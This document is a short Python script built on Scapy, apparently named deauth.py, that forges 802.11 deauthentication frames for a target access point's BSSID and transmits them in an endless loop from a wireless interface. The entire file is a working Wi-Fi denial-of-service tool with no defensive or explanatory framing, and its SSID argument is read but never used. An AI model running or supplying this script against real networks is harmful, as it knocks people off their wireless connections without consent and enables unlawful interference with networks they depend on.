from scapy.all import *
import sys
import time

def deauth(ssid, bssid):
    
    packet = RadioTap()/Dot11(addr1=bssid, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    while True:
        sendp(packet, iface="wlan0", count=100, inter=0.1)  # Change 'wlan0' to your interface

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python deauth.py <SSID> <BSSID>")
        sys.exit(1)

    ssid = sys.argv[1]
    bssid = sys.argv[2]
    deauth(ssid, bssid)